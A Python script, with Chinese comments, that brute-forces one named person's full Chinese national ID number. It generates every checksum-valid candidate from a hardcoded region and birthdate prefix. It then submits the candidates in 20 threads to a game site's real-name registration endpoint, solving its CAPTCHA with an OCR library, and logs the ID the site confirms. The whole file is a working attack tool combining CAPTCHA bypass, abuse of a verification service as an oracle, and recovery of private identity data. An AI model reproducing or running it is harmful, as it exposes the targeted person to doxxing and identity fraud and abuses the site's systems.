import requests
import time
import muggle_ocr
import os
import json
import threadpool
import random
class Finish(SyntaxWarning):
    pass
class PauseInfo(SyntaxWarning):
    pass
pause_num = 0    
def check_id(id):
    # t代表身份证号码的位数，w表示每一位的加权因子
    t = []
    w = []
    for i in range(0,18):
        t1 = i + 1
        t.append(t1)
        w1 = (2 ** (t1-1)) % 11
        w.append(w1)
    #队列w要做一个反序
    w = w[::-1]  

    # 根据前17位的余数，计算第18位校验位的值
    def for_check(n):
        # t = 0
        for i in range(0,12):
            if (n + i) % 11 == 1:
                t = i % 11
        if t == 10:
            t = 'X'
        return t
        
    # 根据身份证的前17位，求和取余，返回余数
    def for_mod(id):
        sum = 0
        for i in range(0,17):
            sum += int(id[i]) * int(w[i])
            # print(int(id[i]),int(w[i]),sum)
        sum = sum % 11
        # print(sum)
        return sum

    # 验证身份证有效性
    def check_true(id):
        # print(for_check(for_mod(id[:-1])))
        if id[-1] == 'X':
            if for_check(for_mod(id[:-1])) == 'X':
                return True
            else:
                return False
        else:
            if for_check(for_mod(id[:-1])) == int(id[-1]):
                return True
            else:
               return False
    return check_true(id)
def convert(session):
    tmp=session.get("http://zc.7k7k.com/")
    tmp=session.get("http://zc.7k7k.com/authcode?width=100&height=42&k=reg").content
    t=str(int(random.random()*10105000))
    with open(f"img\\{t}.png",'wb')as f:
        f.write(tmp)
    sdk = muggle_ocr.SDK(model_type=muggle_ocr.ModelType.OCR)
    with open(f"img\\{t}.png", "rb") as f:
        b = f.read()
    st = time.time()
    text = sdk.predict(image_bytes=b)
    return text    
def check(sfz,xm):
    s=requests.session()
    headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }
    s.headers.update(headers)
    yzm_new=convert(s)
    
    
    data={
    "authcode": yzm_new,
    "identity": "26605667897",
    "realname": xm,
    "card": sfz,
    "mode": "identity",
    "codekey": "reg",
    "password": "123456789"
    }
    
    result=int(json.loads(s.post(url="http://zc.7k7k.com/post_reg",data=data).text)["state"])
    if(result==-10):
        print("验证码识别识别 正在重试(Retry)")
        time.sleep(5)
        check(sfz,xm)
    elif result==0:
        print(f"信息正确:{sfz} : {xm}")
        with open("success","a+") as f:
            f.write(f"信息正确:{sfz} : {xm}\n")
        raise Finish
    elif result==-1:
        print(f"信息错误:{sfz} : {xm}")
#-------------------------------------------------------------------
former="53252719840203"        #区号+生日
lis="0123456789"               
o="0123456789X"
m="13579"#male 男性
f="02468"#female 女性
xm="芶宁岗"#姓名
is_male=True#是否男性
#-------------------------------------------------------------------


def run(sfz_list,pools=10):#批量验证
    works = []
    for i in sfz_list:
            works.append(((i,xm), None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(check, works)
    [pool.putRequest(req) for req in reqs]
    try:
        pool.wait()
    except Finish as e:
            exit(0)
    except Exception as e:
            print('Unknown error so will quit')
            sys.exit(1)
    
    
sfz_list=[]
for i in lis:
    for j in lis:
        if(is_male):
            for k in m:
                for l in o:
                    _all=former+str(i)+str(j)+str(k)+str(l)
                    if(check_id(_all)):
                        sfz_list.append(_all)
        else:
            for k in f:
                for l in o:
                    _all=former+str(i)+str(j)+str(k)+str(l)
                    if(check_id(_all)):
                        sfz_list.append(_all)
run(sfz_list,20)         
